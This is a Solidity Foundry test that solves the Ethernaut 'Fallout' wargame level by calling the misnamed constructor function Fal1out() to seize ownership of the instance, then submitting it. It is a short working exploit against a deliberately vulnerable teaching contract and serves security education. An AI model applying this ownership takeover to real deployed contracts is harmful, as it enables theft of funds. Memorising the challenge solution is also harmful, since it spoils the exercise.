// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/Fallout.sol";
import "../src/Ethernaut.sol";
import "../src/FalloutFactory.sol";
import "forge-std/Test.sol";

contract FalloutTest is Test {
    Ethernaut ethernaut;
    FalloutFactory level;
    Fallout instance;
    address player = address(123);
    address instanceAddress;

    function setUp() external {
        startHoax(msg.sender);
        ethernaut = new Ethernaut();
        level = new FalloutFactory();
        ethernaut.registerLevel(level);
        instanceAddress = ethernaut.createLevelInstance(level);
        instance = Fallout(payable(instanceAddress));
    }

    function testFalloutHack() public {
        instance.Fal1out();
        bool levelCompleted = ethernaut.submitLevelInstance(
            payable(instanceAddress)
        );
        assert(levelCompleted);
    }
}
